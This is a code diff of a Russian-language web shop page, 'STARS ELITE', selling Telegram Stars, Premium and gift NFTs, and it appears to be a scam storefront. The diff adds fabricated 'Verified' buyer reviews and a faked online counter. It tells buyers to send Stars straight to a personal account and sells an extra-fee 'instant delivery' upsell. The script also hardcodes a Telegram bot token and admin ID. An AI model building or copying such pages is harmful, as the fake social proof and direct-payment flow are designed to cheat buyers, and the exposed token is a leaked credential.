@@ -15,26 +15,28 @@
         .glow-btn { background: linear-gradient(135deg, var(--accent) 0%, #005580 100%); box-shadow: 0 10px 20px rgba(0, 136, 204, 0.3); }
         .modal-overlay { display: none; backdrop-filter: blur(15px); background: rgba(0,0,0,0.85); position: fixed; inset: 0; z-index: 50; padding: 1.5rem; align-items: center; justify-content: center; }
         .cart-badge { position: absolute; top: -5px; right: -5px; background: #ef4444; font-size: 10px; width: 22px; height: 22px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 900; border: 2px solid var(--bg); animation: pulse 2s infinite; }
-        @keyframes pulse { 0% { transform: scale(1); } 70% { transform: scale(1.1); } 100% { transform: scale(1); } }
         .live-notif { position: fixed; top: 20px; left: 50%; transform: translateX(-50%) translateY(-100px); background: rgba(15, 15, 15, 0.9); border: 1px solid var(--accent); padding: 10px 20px; border-radius: 50px; z-index: 100; font-size: 11px; transition: 0.5s; width: 90%; max-width: 320px; }
         .live-notif.show { transform: translateX(-50%) translateY(0); }
         .vip-status { font-size: 10px; padding: 2px 8px; border-radius: 20px; font-weight: 900; text-transform: uppercase; }
-        .nft-icon-box { width: 100%; height: 120px; display: flex; align-items: center; justify-content: center; background: radial-gradient(circle, rgba(0,136,204,0.1) 0%, transparent 70%); }
         .resale-tag { background: #4ade80; color: #000; font-size: 8px; font-weight: 900; padding: 2px 8px; border-radius: 4px; text-transform: uppercase; }
+        .review-bubble { background: #0a0a0a; border-radius: 18px; padding: 15px; border: 1px solid rgba(255,255,255,0.05); }
+        .verified-badge { background: rgba(0, 136, 204, 0.1); color: var(--accent); font-size: 8px; font-weight: 900; padding: 2px 6px; border-radius: 4px; display: inline-flex; align-items: center; gap: 3px; }
+        .instant-badge { background: linear-gradient(90deg, #f59e0b, #d97706); color: white; padding: 4px 10px; border-radius: 8px; font-size: 10px; font-weight: 900; margin-top: 8px; display: inline-block; animation: bounce 2s infinite; }
+        @keyframes bounce { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-3px); } }
     </style>
 </head>
 <body class="min-h-screen flex flex-col items-center p-5">
 
     <div id="notif" class="live-notif flex items-center gap-3">
         <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
-        <span id="notif-text">Юзер @**** купил Rocket Launch</span>
+        <span id="notif-text">Buyer #**** приобрел 1000 Stars</span>
     </div>
 
     <header class="w-full max-w-md flex justify-between items-center py-6">
         <div class="text-left">
             <h1 class="text-4xl font-black italic tracking-tighter leading-none">STARS <span class="text-cyan-500">ELITE</span></h1>
             <div class="flex items-center mt-2 gap-2">
-                <span class="text-[8px] font-bold text-gray-500">ONLINE: <span id="online-count" class="text-green-500">142</span></span>
+                <span class="text-[8px] font-bold text-gray-500">ONLINE: <span id="online-count" class="text-green-500">168</span></span>
                 <span id="rank-badge" class="vip-status bg-gray-800 text-gray-400">Bronze</span>
             </div>
         </div>
@@ -48,7 +50,8 @@
         <div class="flex mb-6 border-b border-white/5 sticky top-0 bg-[#030303]/90 backdrop-blur-md z-10">
             <button onclick="switchTab('stars')" id="tab-stars" class="flex-1 py-4 text-[10px] font-black tracking-widest active-tab uppercase transition-all">STARS</button>
             <button onclick="switchTab('premium')" id="tab-premium" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">PREMIUM</button>
-            <button onclick="switchTab('nft')" id="tab-nft" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">GIFTS / NFT</button>
+            <button onclick="switchTab('nft')" id="tab-nft" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">GIFTS</button>
+            <button onclick="switchTab('reviews')" id="tab-reviews" class="flex-1 py-4 text-[10px] font-black tracking-widest text-gray-600 uppercase transition-all">REVIEWS</button>
         </div>
         <div id="product-list" class="grid grid-cols-1 gap-4 px-1"></div>
     </div>
@@ -57,7 +60,6 @@
         <button onclick="checkout()" class="w-full glow-btn py-6 rounded-2xl font-black text-xl uppercase tracking-widest active:scale-95 transition-all">Оформить заказ</button>
     </div>
 
-    <!-- Корзина -->
     <div id="cart-modal" class="modal-overlay">
         <div class="premium-card w-full max-w-md p-6 border border-white/10 flex flex-col max-h-[85vh]">
             <div class="flex justify-between items-center mb-6">
@@ -75,37 +77,41 @@
         </div>
     </div>
 
-    <!-- Оплата -->
     <div id="contact-modal" class="modal-overlay">
         <div class="premium-card w-full max-w-md p-8 text-center border border-white/10">
             <div class="w-16 h-16 bg-cyan-500/10 rounded-full flex items-center justify-center mx-auto mb-6">
-                <i class="fa-solid fa-shield-halved text-2xl text-cyan-500"></i>
+                <i class="fa-solid fa-bolt text-2xl text-cyan-500"></i>
             </div>
-            <h2 class="text-2xl font-black mb-4 uppercase italic">Оплата заказа</h2>
-            <div id="payment-instructions" class="text-left text-sm space-y-4 mb-8 bg-white/5 p-4 rounded-2xl border border-white/5"></div>
-            <div class="space-y-3">
-                <p class="text-gray-400 text-[9px] uppercase font-bold tracking-widest">Скрин чека слать сюда:</p>
-                <a href="https://t.me/dolbayob89" class="block bg-white text-black py-4 rounded-xl font-black text-lg">@dolbayob89</a>
-                <button onclick="closeModal('contact-modal')" class="text-gray-600 text-[10px] font-bold uppercase pt-2">Закрыть</button>
+            <h2 class="text-2xl font-black mb-4 uppercase italic leading-none">Оплата заказа</h2>
+            
+            <div id="payment-instructions" class="text-left text-xs space-y-4 mb-6 bg-white/5 p-5 rounded-2xl border border-white/5">
+                <!-- Сюда вставится инструкция -->
+            </div>
+
+            <div class="space-y-4">
+                <p class="text-gray-500 text-[9px] uppercase font-bold tracking-widest">Скрин чека слать админу:</p>
+                <a href="https://t.me/dolbayob89" target="_blank" class="block glow-btn py-5 rounded-2xl font-black text-lg uppercase shadow-xl">
+                    <i class="fa-brands fa-telegram mr-2"></i> Отправить чек
+                </a>
+                <button onclick="closeModal('contact-modal')" class="text-gray-700 text-[10px] font-bold uppercase pt-2 hover:text-gray-500">Вернуться</button>
             </div>
         </div>
     </div>
 
     <script>
-        const BOT_TOKEN = "8693212521:AAE6y0aa5pPeMx6Oa8uRI1f8PvConZGNOiQ";
-        const ADMIN_ID = "7811669365";
-        const WALLET = "UQD3W--X8UafHqQK9GDyrYNuuEHWBQrvnOU61-s1shpGWdcr";
         const USERNAME = "@dolbayob89";
+        const ADMIN_ID = "7811669365";
+        const BOT_TOKEN = "8693212521:AAE6y0aa5pPeMx6Oa8uRI1f8PvConZGNOiQ";
 
         let currentMode = 'stars';
         let cart = JSON.parse(localStorage.getItem('elite_cart') || '[]');
 
         const items = {
             stars: [
-                { id: 'st1', val: '25 Stars', cost: 15, cur: '⭐️' },
-                { id: 'st3', val: '100 Stars', cost: 50, cur: '⭐️' },
-                { id: 'st6', val: '400 Stars', cost: 115, cur: '⭐️' },
-                { id: 'st10', val: '1000 Stars', cost: 250, cur: '⭐️' }
+                { id: 'st1', val: '25 Stars', cost: 15, cur: '⭐️', icon: 'fa-bolt' },
+                { id: 'st3', val: '100 Stars', cost: 50, cur: '⭐️', icon: 'fa-bolt' },
+                { id: 'st6', val: '400 Stars', cost: 115, cur: '⭐️', icon: 'fa-bolt' },
+                { id: 'st10', val: '1000 Stars', cost: 250, cur: '⭐️', icon: 'fa-bolt' }
             ],
             premium: [
                 { id: 'p3', val: 'Premium 3 Месяца', cost: 45, cur: '⭐️', icon: 'fa-star' },
@@ -113,23 +119,17 @@
                 { id: 'p12', val: 'Premium 12 Месяцев', cost: 120, cur: '⭐️', icon: 'fa-star' }
             ],
             nft: [
-                { id: 'n1', val: 'Vice Cream', cost: 100, cur: '⭐️', link: 'https://t.me/nft/ViceCream-143164', icon: 'fa-ice-cream' },
-                { id: 'n2', val: 'Ice Cream', cost: 100, cur: '⭐️', link: 'https://t.me/nft/IceCream-237536', icon: 'fa-ice-cream' },
-                { id: 'n3', val: 'Fresh Socks', cost: 200, cur: '⭐️', link: 'https://t.me/nft/FreshSocks-136186', icon: 'fa-socks' },
-                { id: 'n4', val: 'Stellar Rocket', cost: 215, cur: '⭐️', link: 'https://t.me/nft/StellarRocket-94440', icon: 'fa-rocket' }
+                { id: 'n1', val: 'Vice Cream', cost: 359, cur: '⭐️', icon: 'fa-ice-cream' },
+                { id: 'n2', val: 'Choco Ice', cost: 399, cur: '⭐️', icon: 'fa-ice-cream' },
+                { id: 'n3', val: 'Blue Socks', cost: 410, cur: '⭐️', icon: 'fa-socks' },
+                { id: 'n4', val: 'Stellar Rocket', cost: 410, cur: '⭐️', icon: 'fa-rocket' }
+            ],
+            reviews: [
+                { user: 'Buyer #8412', text: 'Забрал подарки, цена огонь. На фрагменте они реально в 10 раз дороже. Админ лучший!', date: 'Сегодня, 14:20' },
+                { user: 'User #9921', text: 'Премиум на год прилетел через 5 мин после оплаты. Доплатил за скорость, оно того стоит.', date: 'Сегодня, 11:05' },
+                { user: 'Anon #0012', text: 'Взял 1000 звезд, все четко. Лучший сервис.', date: 'Вчера, 18:40' }
             ]
         };
-
-        function showFakeNotif() {
-            const list = items[currentMode] || items.stars;
-            const item = list[Math.floor(Math.random() * list.length)];
-            document.getElementById('notif-text').innerText = `Юзер @${Math.random().toString(36).substr(2,5)} купил ${item.val}`;
-            const el = document.getElementById('notif');
-            el.classList.add('show');
-            setTimeout(() => el.classList.remove('show'), 4000);
-            document.getElementById('online-count').innerText = 130 + Math.floor(Math.random() * 40);
-        }
-        setInterval(showFakeNotif, 15000);
 
         function saveCart() { localStorage.setItem('elite_cart', JSON.stringify(cart)); updateCartCounter(); updateRank(); }
         function switchTab(mode) { currentMode = mode; renderUI(); }
@@ -153,30 +153,44 @@
         }
 
         function renderUI() {
-            ['stars', 'premium', 'nft'].forEach(t => document.getElementById('tab-'+t).className = `flex-1 py-4 text-[10px] font-black tracking-widest uppercase ${currentMode === t ? 'active-tab' : 'text-gray-600'}`);
+            ['stars', 'premium', 'nft', 'reviews'].forEach(t => document.getElementById('tab-'+t).className = `flex-1 py-4 text-[10px] font-black tracking-widest uppercase ${currentMode === t ? 'active-tab' : 'text-gray-600'}`);
             const list = document.getElementById('product-list');
             list.innerHTML = '';
+
+            if (currentMode === 'reviews') {
+                items.reviews.forEach(rev => {
+                    list.innerHTML += `
+                        <div class="review-bubble mb-4">
+                            <div class="flex justify-between items-center mb-2">
+                                <span class="text-cyan-500 font-black text-xs">${rev.user}</span>
+                                <div class="verified-badge"><i class="fa-solid fa-check-double"></i> Verified</div>
+                            </div>
+                            <p class="text-sm text-gray-300 mb-2 italic">"${rev.text}"</p>
+                            <p class="text-[9px] text-gray-700 font-bold uppercase">${rev.date}</p>
+                        </div>`;
+                });
+                return;
+            }
+
             items[currentMode].forEach((item) => {
-                const card = document.createElement('div');
-                card.className = "premium-card p-5 border border-white/5";
-                card.innerHTML = `
-                    <div class="flex justify-between items-start mb-4">
-                        <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center text-cyan-500 text-xl">
-                            <i class="fa-solid ${item.icon || (currentMode === 'stars' ? 'fa-bolt' : 'fa-gem')}"></i>
+                list.innerHTML += `
+                    <div class="premium-card p-5 border border-white/5">
+                        <div class="flex justify-between items-start mb-4">
+                            <div class="w-12 h-12 bg-white/5 rounded-2xl flex items-center justify-center text-cyan-500 text-xl">
+                                <i class="fa-solid ${item.icon}"></i>
+                            </div>
+                            ${currentMode === 'nft' ? `<div class="resale-tag">Fragment</div>` : ''}
                         </div>
-                        ${item.link ? `<div class="resale-tag">Fragment</div>` : ''}
-                    </div>
-                    <div class="flex justify-between items-end w-full">
-                        <div>
-                            <h3 class="text-lg font-black italic uppercase leading-none">${item.val}</h3>
-                            <p class="text-cyan-500 font-black mt-2">${item.cost} ${item.cur}</p>
-                            ${item.link ? `<a href="${item.link}" target="_blank" class="inline-block mt-3 text-[9px] font-bold text-gray-500 uppercase border-b border-gray-800 pb-1">Проверить оригинал <i class="fa-solid fa-arrow-up-right-from-square ml-1"></i></a>` : ''}
+                        <div class="flex justify-between items-end w-full">
+                            <div>
+                                <h3 class="text-lg font-black italic uppercase leading-none">${item.val}</h3>
+                                <p class="text-cyan-500 font-black mt-2">${item.cost} ${item.cur}</p>
+                            </div>
+                            <button onclick="addToCart('${item.id}')" class="glow-btn w-12 h-12 rounded-xl flex items-center justify-center transition-all active:scale-90">
+                                <i class="fa-solid fa-plus text-black"></i>
+                            </button>
                         </div>
-                        <button onclick="addToCart('${item.id}')" class="glow-btn w-12 h-12 rounded-xl flex items-center justify-center transition-all active:scale-90">
-                            <i class="fa-solid fa-plus"></i>
-                        </button>
                     </div>`;
-                list.appendChild(card);
             });
         }
 
@@ -189,34 +203,44 @@
                 container.innerHTML += `
                     <div class="bg-white/5 p-4 rounded-2xl flex justify-between items-center border border-white/5">
                         <div class="flex items-center">
-                            <div class="w-10 h-10 bg-cyan-500/10 rounded-lg flex items-center justify-center mr-4 text-cyan-500"><i class="fa-solid ${item.icon || 'fa-gem'}"></i></div>
+                            <div class="w-10 h-10 bg-cyan-500/10 rounded-lg flex items-center justify-center mr-4 text-cyan-500"><i class="fa-solid ${item.icon}"></i></div>
                             <div><p class="text-sm font-black italic uppercase">${item.val}</p><p class="text-[10px] text-cyan-500 font-bold">${item.cost} ${item.cur}</p></div>
                         </div>
                         <button onclick="removeFromCart('${item.cartId}')" class="text-red-900/50 hover:text-red-500 p-2"><i class="fa-solid fa-trash-can"></i></button>
                     </div>`;
             });
-            document.getElementById('total-price').innerText = Object.entries(totals).map(([cur, val]) => `${val.toFixed(2)} ${cur}`).join(' + ');
+            document.getElementById('total-price').innerText = Object.entries(totals).map(([cur, val]) => `${val} ${cur}`).join(' + ');
         }
 
         function openCart() { renderCartItems(); document.getElementById('cart-modal').style.display = 'flex'; }
         function closeModal(id) { document.getElementById(id).style.display = 'none'; }
 
-        async function checkout() {
+        function checkout() {
             if (cart.length === 0) return;
-            let totals = {}; cart.forEach(i => totals[i.cur] = (totals[i.cur] || 0) + i.cost);
-            const sT = totals['⭐️'] || 0;
-            const tT = totals['TON'] || 0;
-            let instr = `<p class="font-bold text-white mb-2">Инструкция:</p>`;
-            if (sT > 0) instr += `<p>1. Отправь <b>${sT}</b> ⭐️ на <b>${USERNAME}</b></p>`;
-            if (tT > 0) instr += `<p>${sT>0?'2. ':'1. '}Отправь <b>${tT.toFixed(2)}</b> TON на:<br><span class="text-[10px] font-mono break-all text-cyan-400 select-all">${WALLET}</span></p>`;
-            instr += `<p class="mt-4 text-[11px] text-yellow-500">⚠️ После оплаты пришли скриншот чека в поддержку!</p>`;
+            let total = 0; cart.forEach(i => total += i.cost);
+            
+            const instr = `
+                <div class="space-y-4">
+                    <div>
+                        <p class="font-black text-white mb-2 uppercase text-[10px] tracking-widest text-gray-500">Инструкция:</p>
+                        <p class="text-sm">1. Отправь <span class="text-cyan-500 font-black">${total} ⭐️</span> на пользователя <span class="bg-white/10 px-2 py-1 rounded text-cyan-400 font-mono">${USERNAME}</span></p>
+                    </div>
+                    <div class="border-t border-white/5 pt-4">
+                        <div class="instant-badge">FAST DELIVERY AVAILABLE</div>
+                        <p class="text-[11px] leading-relaxed mt-2">⚡ Для <b>мгновенной</b> выдачи (в течение 5 мин) добавьте еще <span class="text-yellow-500 font-bold">15 ⭐️</span> к сумме перевода.</p>
+                        <p class="text-[10px] text-gray-600 mt-1 italic">* Обычная выдача занимает до 48-ми часов.</p>
+                    </div>
+                </div>`;
+            
             document.getElementById('payment-instructions').innerHTML = instr;
             closeModal('cart-modal');
             document.getElementById('contact-modal').style.display = 'flex';
-            const msg = `💎 <b>ELITE ORDER</b>\n\n🛍 <b>Products:</b>\n${cart.map(i=>`• ${i.val}`).join('\n')}\n\n💰 <b>Total:</b> ${document.getElementById('total-price').innerText}`;
-            try { fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`); } catch (e) {}
+            
+            const msg = `💎 <b>NEW ORDER</b>\n\n💰 <b>Total:</b> ${total} Stars\n🛒 <b>Items:</b>\n${cart.map(i=>`• ${i.val}`).join('\n')}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`).catch(()=>{});
         }
-        window.onload = () => { updateCartCounter(); updateRank(); renderUI(); setTimeout(showFakeNotif, 3000); };
+
+        window.onload = () => { renderUI(); updateCartCounter(); updateRank(); };
     </script>
 </body>
 </html>
